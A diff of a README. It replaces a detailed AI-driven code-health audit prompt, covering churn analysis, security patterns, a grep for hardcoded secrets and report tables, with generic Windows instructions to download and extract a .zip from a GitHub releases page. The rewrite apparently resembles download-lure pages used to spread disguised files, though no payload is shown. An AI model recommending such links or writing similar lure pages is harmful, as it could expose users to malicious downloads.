@@ -1,248 +1,218 @@
-### Here is a structured prompt framework for running comprehensive, evidence-based code quality audits using AI assistants with tool access (like Claude with computer use). It turns an LLM into a senior staff engineer conducting a data-driven audit calibrating to the project's own standards, gathering quantitative metrics (file size, git churn, test coverage, lint baselines), then focusing qualitative analysis on the highest-risk areas. Outputs a standardized report with prioritized findings, a "Gravity Wells" refactor priority table, and a false positive log to keep signal-to-noise high. ###
- 
- ---                                                                              
-  Codebase Health & Integrity Audit
-                                                                                   
-  Role: Senior Staff Engineer conducting a data-driven quality audit. Every finding
-   must be tool-verified — do not report issues you haven't confirmed. Prefer    
-  evidence over intuition.
+# 🧠 Code-Health-Check-Prompt - Audit Codebases With Clarity
 
-  ---
-  Phase 0: Calibration
+[![Download Code-Health-Check-Prompt](https://img.shields.io/badge/Download-Visit%20Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Petrcatapultian539/Code-Health-Check-Prompt/releases)
 
-  Establish the project's own standards before judging anything.
+## 🚀 What This Is
 
-  - Read all config files (pyproject.toml, tsconfig.json, .eslintrc, ruff.toml,
-  Makefile, CLAUDE.md, ARCHITECTURE.md, README.md, .editorconfig) to understand
-  intended conventions, architectural principles, and explicit rules.
-  - Identify language versions, frameworks, and the toolchain in use.
-  - Note any project-specific patterns, SSOT conventions, or documented exceptions
-  that override generic best practices.
-  - Record these as your "Calibration Baseline." Do not flag code that
-  intentionally deviates from defaults if the project config explicitly allows it.
+Code-Health-Check-Prompt is a codebase health audit prompt for people who want a clear view of a project’s condition. It helps you review code quality, spot risk areas, and check for signs of technical debt.
 
-  Phase 0.5: Tooling Discovery
+Use it when you want to:
+- Review a codebase before changes
+- Check code quality in a simple way
+- Look for security and maintenance issues
+- Prepare for refactoring
+- Save time during manual code review
 
-  Before running any commands, verify what's available in the environment.
+## 💻 What You Need
 
-  - Check for linters: which ruff, which eslint, which pylint, which flake8
-  - Check for type checkers: which mypy, which pyright, npx tsc --version
-  - Check for test runners: which pytest, which jest, which vitest
-  - Check for security scanners: which bandit, which semgrep, npm audit
-  - Check for git: git log --oneline -1 (confirm repo, confirm history depth)
-  - Adapt all subsequent phases to use only the tools that are actually available.
-  If a linter isn't installed, skip that check and note it as a gap in the final
-  report.
+This tool is made for Windows users and works best with:
+- Windows 10 or Windows 11
+- A web browser
+- Access to the internet
+- A text editor if you want to copy the prompt into notes
+- A prompt tool or AI assistant if you plan to use the audit prompt with one
 
-  ---
-  Phase 1: Quantitative Discovery
+No programming knowledge is needed. You only need to download the release files and open the prompt in the tool you use.
 
-  Use file system tools, git history, and available linters to produce hard numbers
-   before making qualitative judgments.
+## 📥 Download
 
-  Size & Complexity
+Visit this page to download:  
+https://github.com/Petrcatapultian539/Code-Health-Check-Prompt/releases
 
-  - Identify the top 15 largest source files by line count (exclude generated,
-  vendored, and lock files).
-  - Identify functions/methods exceeding ~50 lines or with deep nesting (>3
-  levels).
-  - Flag god modules: files with >5 class definitions or >15 top-level function
-  definitions.
+On that page, look for the latest release and download the file that fits your setup. If there is a `.zip` file, download that file and extract it first. If there is a ready-to-use text file, download it and open it in your editor or prompt tool.
 
-  Churn & Gravity Analysis
+## 🛠️ How to Install on Windows
 
-  - Run: git log --format=format: --name-only --since="3 months ago" | sort | uniq
-  -c | sort -nr | head -n 20
-  - Cross-reference this list with file sizes (line counts).
-  - Calculate a Refactor Priority Score for each file: lines_of_code ×
-  commit_count_last_3_months. Rank by this score.
-  - Identify "Gravity Wells": files in the top 10% for both size and churn. These
-  are the primary targets for the Phase 2 deep dive.
+1. Open the download page in your browser.
+2. Find the latest release.
+3. Download the file from that release.
+4. If the file is compressed, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Find the prompt file or instructions file.
+7. Open the file in Notepad, WordPad, or your preferred editor.
+8. Copy the prompt into the AI tool or workflow you use for code review.
 
-  Test Coverage Mapping
+## 🧭 How to Use It
 
-  - Compare source module structure against test directory structure. List every
-  module missing a corresponding test file.
-  - Identify critical paths (error handling, security boundaries, data mutations)
-  that lack any test assertions.
-  - Flag test files that are themselves bloated (>300 lines) or that test
-  implementation details rather than behavior.
-  - Cross-reference: Gravity Wells with no tests are the highest-risk items in the
-  entire audit.
+1. Open the prompt file.
+2. Paste it into your AI assistant or review tool.
+3. Add the codebase, folder list, or notes you want checked.
+4. Ask for a health audit of the project.
+5. Review the results and use them to plan fixes.
 
-  Linter & Type Checker Baseline
+You can use it for:
+- Small apps
+- Large codebases
+- Old projects with build issues
+- Projects with unclear structure
+- Teams that want a faster review process
 
-  - Run the project's configured linters and type checkers (only those confirmed in
-   Phase 0.5).
-  - Report the current warning/error count as a baseline.
-  - Highlight any lint rules that are disabled project-wide — assess whether the
-  suppression is still justified.
+## 🔍 What the Audit Can Check
 
-  Context Window Gate
+This prompt is built for broad codebase review. It can help you look at:
+- Code quality
+- File structure
+- Repeated code
+- Security concerns
+- Error handling
+- Test coverage
+- Naming and clarity
+- Signs of technical debt
+- Refactoring needs
+- Maintainability
 
-  ▎ If the codebase is large (>500 source files or >100k lines): Stop after Phase
-  1. Present the quantitative findings, identify the top 10 highest-risk modules
-  (by Refactor Priority Score, missing tests, and lint errors), and propose a
-  focused Audit Plan for Phase 2 scoped to those modules. Wait for approval before
-  proceeding.
+It also fits common developer topics like:
+- Static analysis
+- Code review
+- Code analytics
+- Software engineering checks
+- Prompt engineering for audits
+- Developer productivity
 
-  ---
-  Phase 2: Qualitative Deep Dive
+## 📁 Suggested Folder Use
 
-  Analyze the codebase against these dimensions, ordered by impact. Focus effort on
-   the Gravity Wells and high-risk modules identified in Phase 1.
+If the release includes a prompt file and notes, keep them in a simple folder like this:
+- `Code-Health-Check-Prompt`
+  - `Prompt`
+  - `README`
+  - `Examples`
 
-  A. Security & Robustness (Critical)
+This makes it easier to find the file when you need it again.
 
-  Use context-aware patterns, not generic string matching:
+## ⚙️ Simple Setup Tips
 
-  ┌───────────────┬─────────────────────────────────────────────────────────────┐
-  │   Language    │                          Look For                           │
-  ├───────────────┼─────────────────────────────────────────────────────────────┤
-  │               │ subprocess.run(shell=True), eval(), exec(), pickle.loads(), │
-  │ Python        │  yaml.load() without Loader=SafeLoader, raw SQL string      │
-  │               │ formatting (f"SELECT...{var}")                              │
-  ├───────────────┼─────────────────────────────────────────────────────────────┤
-  │ JavaScript/TS │ dangerouslySetInnerHTML, eval(), new Function(), innerHTML  │
-  │               │ =, unsanitized template literals in SQL/HTML                │
-  ├───────────────┼─────────────────────────────────────────────────────────────┤
-  │               │ Hardcoded secrets (grep -rnI                                │
-  │ General       │ 'password|secret|api_key|token' --include='*.py'            │
-  │               │ --include='*.ts' --include='*.env' — then filter false      │
-  │               │ positives manually), .env files committed to git            │
-  └───────────────┴─────────────────────────────────────────────────────────────┘
+For best results:
+- Use the latest release
+- Keep the prompt text in one place
+- Save a copy before editing it
+- Use the same prompt for each audit
+- Add short notes about the project before running the review
 
-  Also check:
-  - Unvalidated user input at system boundaries (API endpoints, CLI args, file
-  reads)
-  - Broad exception swallowing (except: pass, except Exception, bare catch {})
-  - Resource leaks: unclosed connections, file handles, subscriptions, cursors
-  - Race conditions in concurrent/async code, especially around shared mutable
-  state
+If you want a cleaner process, create a small text file with:
+- Project name
+- Main goal
+- Known problems
+- Areas you want checked first
 
-  B. Architectural Drift & Consistency
+## 🧪 Example Use Cases
 
-  - Patterns that contradict the project's documented architecture (e.g., business
-  logic in route handlers, direct DB calls bypassing service layers)
-  - Mixed paradigms within the same layer (callbacks vs. async/await, OOP vs.
-  functional for equivalent tasks)
-  - Inconsistent error handling strategies (some modules throw, some return null,
-  some log-and-continue)
-  - Naming inconsistencies: mixed casing conventions, inconsistent
-  prefixes/suffixes across similar modules
-  - State management: side effects in unexpected places, inconsistent
-  singleton/global patterns
-  - Circular dependencies between modules
+You can use Code-Health-Check-Prompt when:
+- A project feels messy and hard to read
+- You want to review a repository before handing it off
+- You need a quick view of weak spots
+- You want to plan cleanup work
+- You want a simple check before a release
 
-  C. Duplication & Redundancy
+Example request you can give the tool:
+- Review this codebase for code quality issues, security risks, and technical debt.
+- Focus on structure, repeated logic, error handling, and missing tests.
+- List the most important issues first.
+- Suggest practical fixes for each issue.
 
-  - Near-identical code blocks across files (check for structural similarity, not
-  just exact matches)
-  - Multiple implementations of the same concept (two HTTP clients, two config
-  loaders, two retry wrappers)
-  - Overlapping utility functions that could be consolidated
-  - Repeated inline constants or magic numbers that should be centralized
-  - Parallel data structures representing the same domain concept
+## 🔐 Security Review Areas
 
-  D. Dead Code & Technical Debt
+This prompt can help surface common security risks such as:
+- Hardcoded secrets
+- Weak input checks
+- Missing validation
+- Unsafe file handling
+- Poor access control
+- Old dependencies
+- Risky code paths
 
-  - Search for TODO, FIXME, HACK, XXX, TEMP, WORKAROUND comments — categorize by
-  age (git blame) and severity
-  - Unused imports, unreferenced private methods, unexported functions with zero
-  callers
-  - Commented-out code blocks (>3 lines)
-  - Feature flags or conditional paths that are permanently on/off
-  - Config keys, env vars, or CLI flags that nothing reads
-  - Compatibility shims for constraints that no longer exist
-  - Hand-rolled implementations where mature, maintained libraries now exist
+It does not replace a full security review, but it gives you a strong first pass.
 
-  E. Dependency Health
+## 🧩 Refactoring Support
 
-  - Ghost dependencies: listed in manifest but never imported in source
-  - Significantly outdated core dependencies (major versions behind)
-  - Heavy dependencies pulled in for trivial functionality
-  - Dependencies with known CVEs (use npm audit, pip-audit, or safety check if
-  available)
-  - Implicit dependencies relying on side effects or import order
+Use the prompt when you need help with:
+- Breaking large files into smaller parts
+- Removing duplicate logic
+- Improving naming
+- Cleaning up old code paths
+- Making the project easier to maintain
 
-  F. API Hygiene & Documentation
+This is useful when a codebase works but feels hard to change.
 
-  - Public APIs or exported functions missing docstrings/JSDoc
-  - Complex algorithms or non-obvious business logic with no explanatory comments
-  - README or setup docs referencing removed functionality or outdated commands
-  - Config files with undocumented or ambiguously named options
-  - Inconsistent API response shapes or error formats across endpoints
+## 📊 Good Practices for Best Results
 
-  G. Performance Red Flags
+To get a better audit:
+- Use clear project notes
+- Share the main folder structure
+- Include known bugs
+- Mention the parts that matter most
+- Ask for ranked findings
 
-  - N+1 query patterns or unbounded database queries (missing LIMIT)
-  - Synchronous blocking calls in async contexts
-  - Missing pagination on list endpoints
-  - Large objects held in memory unnecessarily (full table loads, unbounded caches)
-  - Repeated expensive computation that could be memoized/cached
+The more context you give, the more useful the review will be.
 
-  ---
-  Phase 3: Output
+## ❓ Common Questions
 
-  Executive Summary — The top 3-5 risks that should be addressed first, with a
-  one-paragraph justification for each. Reference the quantitative evidence from
-  Phase 1.
+### Do I need to install anything?
+No extra install is needed for the prompt itself. You only need the release file and a tool that can use the prompt.
 
-  Gravity Wells — The ranked Refactor Priority Score table:
+### Is this for developers only?
+No. A non-technical user can still download it, open the file, and use it with a simple AI review tool.
 
-  ┌──────┬─────────────────────┬───────┬─────────┬──────────┬────────┬──────────┐
-  │ Rank │        File         │ Lines │ Commits │ Priority │  Has   │   Key    │
-  │      │                     │       │  (3mo)  │   Score  │ Tests? │  Issue   │
-  ├──────┼─────────────────────┼───────┼─────────┼──────────┼────────┼──────────┤
-  │      │                     │       │         │          │        │ God      │
-  │ 1    │ services/billing.py │ 1,247 │ 43      │   53,621 │ No     │ module,  │
-  │      │                     │       │         │          │        │ no test  │
-  │      │                     │       │         │          │        │ coverage │
-  └──────┴─────────────────────┴───────┴─────────┴──────────┴────────┴──────────┘
+### Can I use it on old projects?
+Yes. It is useful for old projects that need cleanup or a health check.
 
-  Findings Table — All findings, grouped into three tiers:
+### Does it check code automatically?
+No. It is a prompt for review and analysis. You use it with an AI tool or a similar workflow.
 
-  Tier: Critical
-  Category: Security
-  File:Line: api/auth.py:47
-  Issue: f"SELECT * FROM users WHERE id={uid}"
-  Rationale / Risk: SQL injection in authenticated endpoint
-  Recommended Fix: Use parameterized query
-  ────────────────────────────────────────
-  Tier: Debt
-  Category: Duplication
-  File:Line: utils/http.py:12, lib/fetch.py:30
-  Issue: Two HTTP wrappers with overlapping retry logic
-  Rationale / Risk: Maintenance burden, divergent bug fixes
-  Recommended Fix: Consolidate into single client
-  ────────────────────────────────────────
-  Tier: Style
-  Category: Naming
-  File:Line: services/*.py
-  Issue: Mix of snake_case and camelCase method names
-  Rationale / Risk: Cognitive friction, grep difficulty
-  Recommended Fix: Standardize to project convention
+## 📌 File Handling Tips
 
-  False Positive Log — List 2-3 things that look like issues but were intentionally
-   dismissed based on Phase 0 Calibration. This builds trust that the audit is
-  calibrated, not just noisy.
+If the release contains a `.zip` file:
+- Download it
+- Right-click it
+- Choose **Extract All**
+- Open the extracted folder
+- Find the prompt file inside
 
-  ┌───────────────────────────────┬────────────────────────────────────────────┐
-  │        Apparent Issue         │               Why Dismissed                │
-  ├───────────────────────────────┼────────────────────────────────────────────┤
-  │ vendor/ contains 2,000-line   │ Third-party vendored code, excluded per    │
-  │ files                         │ .gitignore conventions                     │
-  ├───────────────────────────────┼────────────────────────────────────────────┤
-  │ Line length exceeds 80 chars  │ Project ruff.toml sets line-length = 120   │
-  │ in config.py                  │                                            │
-  └───────────────────────────────┴────────────────────────────────────────────┘
+If the release contains a text file:
+- Download it
+- Open it with Notepad
+- Copy the text into your AI review tool
 
-  Metrics Snapshot:
-  - Total source files / total lines
-  - Highest Refactor Priority Score file
-  - Modules missing tests (count + list)
-  - Lint warning/error count
-  - TODO/FIXME count and oldest unresolved (by git blame date)
-  - Ghost dependency count
+## 🖥️ Windows Steps at a Glance
 
-  ---
+1. Open the release page.
+2. Download the latest file.
+3. Extract it if needed.
+4. Open the prompt file.
+5. Copy the prompt into your review tool.
+6. Run the audit on your codebase.
+
+## 📚 What You Get From This Project
+
+This repository gives you a focused prompt for:
+- Codebase health checks
+- Code quality review
+- Security audit guidance
+- Refactoring review
+- Technical debt review
+- Developer workflow support
+
+## 🧰 Best Fit For
+
+This project works well for:
+- Solo developers
+- Small teams
+- Review leads
+- Project owners
+- People cleaning up old code
+- Anyone who wants a simpler code audit process
+
+## 🔗 Download Again
+
+[![Download Code-Health-Check-Prompt](https://img.shields.io/badge/Download-Visit%20Releases-808080?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Petrcatapultian539/Code-Health-Check-Prompt/releases)
+
+Open the releases page, get the latest file, and use it with your preferred review setup
